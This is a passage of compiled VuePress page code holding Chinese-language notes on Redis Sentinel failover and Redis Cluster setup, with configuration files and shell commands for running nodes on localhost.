number\"}},[s._v(\"30000\")]),s._v(\"\\nsentinel parallel-syncs mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\nsentinel failover-timeout mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"180000\")]),s._v(\"\\n\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"vim\")]),s._v(\" redis-sentinel-26380.conf\\n\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"26380\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"26380.log\"')]),s._v(\"\\nsentinel monitor mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2\")]),s._v(\"\\nsentinel down-after-milliseconds mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"30000\")]),s._v(\"\\nsentinel parallel-syncs mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\nsentinel failover-timeout mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"180000\")]),s._v(\"\\n\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"vim\")]),s._v(\" redis-sentinel-26381.conf\\n\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"26381\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"26381.log\"')]),s._v(\"\\nsentinel monitor mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2\")]),s._v(\"\\nsentinel down-after-milliseconds mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"30000\")]),s._v(\"\\nsentinel parallel-syncs mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\nsentinel failover-timeout mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"180000\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#启动\")]),s._v(\"\\nredis-sentinel redis-sentinel-26379.conf\\nredis-sentinel redis-sentinel-26380.conf\\nredis-sentinel redis-sentinel-26381.conf\\n\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"'),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v('.log\"')]),s._v(\"\\nsentinel monitor mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2\")]),s._v(\"\\nsentinel down-after-milliseconds mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"30000\")]),s._v(\"\\nsentinel parallel-syncs mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\nsentinel failover-timeout mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"180000\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"31\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"32\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"33\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"34\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"35\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"36\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"37\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"38\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"39\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"40\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"41\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"42\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"43\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"44\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"45\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"46\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"47\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"故障转移\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#故障转移\"}},[s._v(\"#\")]),s._v(\" 故障转移\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v('从 slave 节点中选出一个\"合适的\"节点作为新的 master')]),s._v(\" \"),t(\"li\",[s._v(\"对上面的 slave 节点执行\"),t(\"code\",[s._v(\"slaveof no one\")]),s._v(\"命令让其成为 master 节点\")]),s._v(\" \"),t(\"li\",[s._v(\"向剩余的 slave 节点发送命令，让他们成为新 master 节点的 slave 节点，复制规则和 parallel-syncs 参数有关\")]),s._v(\" \"),t(\"li\",[s._v('更新对原来 master 节点配置为 slave，并保持着对其\"关注\"，当其恢复后命令他去复制新的 master 节点')])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"选择-合适的-节点\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#选择-合适的-节点\"}},[s._v(\"#\")]),s._v(' 选择\"合适的\"节点')]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"选择\"),t(\"code\",[s._v(\"slave-priority\")]),s._v(\"(slave 节点优先级)最高的 slave 节点，如果存在则返回，不存在则继续\")]),s._v(\" \"),t(\"li\",[s._v(\"选择复制偏移量最大的 slave 节点(复制的最完整)，如果存在则返回，不存在则继续\")]),s._v(\" \"),t(\"li\",[s._v(\"选择 runID 最小的 slave 节点\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"常见问题-3\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#常见问题-3\"}},[s._v(\"#\")]),s._v(\" 常见问题\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"节点运维\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#节点运维\"}},[s._v(\"#\")]),s._v(\" 节点运维\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"机器下线：例如过保等情况\")]),s._v(\" \"),t(\"li\",[s._v(\"机器性能不足：例如 CPU、内存、硬盘、网络等\")]),s._v(\" \"),t(\"li\",[s._v(\"节点自身故障：例如服务不稳定等\")])]),s._v(\" \"),t(\"p\",[s._v(\"主节点： \"),t(\"code\",[s._v(\"sentinel failover <masterName></masterName>\")])]),s._v(\" \"),t(\"p\",[s._v(\"从节点：临时下线还是永久下线，例如是否做一些清理工作。但是要考虑读写分离的情况\")]),s._v(\" \"),t(\"p\",[s._v(\"Sentinel 节点：同上\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"节点上线\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#节点上线\"}},[s._v(\"#\")]),s._v(\" 节点上线\")]),s._v(\" \"),t(\"p\",[s._v(\"主节点： \"),t(\"code\",[s._v(\"sentinel failover\")]),s._v(\"进行替换\")]),s._v(\" \"),t(\"p\",[s._v(\"从节点：\"),t(\"code\",[s._v(\"slaveof\")]),s._v(\"即可，sentinel 节点可以感知\")]),s._v(\" \"),t(\"p\",[s._v(\"Sentinel 节点：参考其他 sentinel 节点启动即可\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"高可用读写分离\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#高可用读写分离\"}},[s._v(\"#\")]),s._v(\" 高可用读写分离\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"从节点对作用\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#从节点对作用\"}},[s._v(\"#\")]),s._v(\" 从节点对作用\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"副本：高可用的基础\")]),s._v(\" \"),t(\"li\",[s._v(\"扩展：读能力\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"三个-消息\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#三个-消息\"}},[s._v(\"#\")]),s._v(' 三个\"消息\"')]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"+switch-master：切换主节点(从节点晋升主节点)\")]),s._v(\" \"),t(\"li\",[s._v(\"+conver-to-slave：切换从节点(原主节点降为从节点)\")]),s._v(\" \"),t(\"li\",[s._v(\"sdown：主观下线\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"redis-cluster\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-cluster\"}},[s._v(\"#\")]),s._v(\" Redis Cluster\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"集群\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#集群\"}},[s._v(\"#\")]),s._v(\" 集群\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"并发量\")]),s._v(\" \"),t(\"li\",[s._v(\"数据量\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"数据分布\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#数据分布\"}},[s._v(\"#\")]),s._v(\" 数据分布\")]),s._v(\" \"),t(\"table\",[t(\"thead\",[t(\"tr\",[t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"分布方式\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"特点\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"典型产品\")])])]),s._v(\" \"),t(\"tbody\",[t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"哈希分布\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"数据分散度高 \"),t(\"br\"),s._v(\"键值分布业务无关 \"),t(\"br\"),s._v(\"无法顺序访问 \"),t(\"br\"),s._v(\"支持批量操作\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"一致性哈希 \"),t(\"br\"),s._v(\"Memcache \"),t(\"br\"),s._v(\"Redis Cluster \"),t(\"br\"),s._v(\"其他缓存产品\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"顺序分布\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"数据分散度倾斜 \"),t(\"br\"),s._v(\"键值业务相关 \"),t(\"br\"),s._v(\"可顺序访问 \"),t(\"br\"),s._v(\"支持批量操作\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"BigTable \"),t(\"br\"),s._v(\"HBase\")])])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"顺序分布\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#顺序分布\"}},[s._v(\"#\")]),s._v(\" 顺序分布\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"哈希分布-例如节点取模\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#哈希分布-例如节点取模\"}},[s._v(\"#\")]),s._v(\" 哈希分布(例如节点取模)\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"节点取余分区\\n\"),t(\"ul\",[t(\"li\",[s._v(\"节点取余：hash(key)%nodes\\n\"),t(\"ul\",[t(\"li\",[s._v(\"客户端分片：哈希 + 取余\")]),s._v(\" \"),t(\"li\",[s._v(\"节点伸缩：数据节点关系变化，导致数据迁移\")]),s._v(\" \"),t(\"li\",[s._v(\"迁移数量和添加节点数量有关：建议翻倍扩容\")])])])])]),s._v(\" \"),t(\"li\",[s._v(\"一致性哈希分区\\n\"),t(\"ul\",[t(\"li\",[s._v(\"客户端分片：哈希 + 顺时针(优化取余)\")]),s._v(\" \"),t(\"li\",[s._v(\"节点伸缩：只影响邻近节点，但是还是有数据迁移\")]),s._v(\" \"),t(\"li\",[s._v(\"翻倍伸缩：保证最小迁移数据和负载均衡\")])])]),s._v(\" \"),t(\"li\",[s._v(\"虚拟槽分区 CRC16(key) & 16383\\n\"),t(\"ul\",[t(\"li\",[s._v(\"预设虚拟槽：每个槽映射一个数据子集，一般比节点大\")]),s._v(\" \"),t(\"li\",[s._v(\"良好的哈希函数：例如 CRC16\")]),s._v(\" \"),t(\"li\",[s._v(\"服务端管理节点、槽、数据：例如 Redis Cluster\")])])])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安装\"}},[s._v(\"#\")]),s._v(\" 安装\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"原生命令安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#原生命令安装\"}},[s._v(\"#\")]),s._v(\" 原生命令安装\")]),s._v(\" \"),t(\"p\",[s._v(\"Cluster 节点主要配置\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"cluster-enabled \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\ncluster-node-timeout \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"15000\")]),s._v(\"\\ncluster-config-file nodes.conf\\ncluster-require-full-coverage \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"p\",[s._v(\"Cluster 常用命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli -c -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\ncluster info\\ncluster nodes\\ncluster slots\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"ol\",[t(\"li\",[s._v(\"配置开启节点\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#配置开启Redis\")]),s._v(\"\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\ndbfilename \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dump-'),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v('.rdb\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"'),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v('.log\"')]),s._v(\"\\ncluster-enabled \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\ncluster-config-file nodes-\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v(\".conf\\ncluster-require-full-coverage no\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mkdir\")]),s._v(\" /usr/local/redis/config\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mkdir\")]),s._v(\" /usr/local/redis/data\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /usr/local/redis/config\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" redis-7000.conf\\n\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\ndbfilename \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dump-7000.rdb\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"7000.log\"')]),s._v(\"\\ncluster-enabled \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\ncluster-config-file nodes-7000.conf\\ncluster-require-full-coverage no\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7001/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7001.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7002/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7002.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7003/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7003.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7004/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7004.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7005/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7005.conf\\n\\nredis-server redis-7000.conf\\nredis-server redis-7001.conf\\nredis-server redis-7002.conf\\nredis-server redis-7003.conf\\nredis-server redis-7004.conf\\nredis-server redis-7005.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"31\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"32\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"33\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"34\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"35\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"36\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"meet\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#cluster meet ip port\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7001\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7002\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7003\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7004\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet 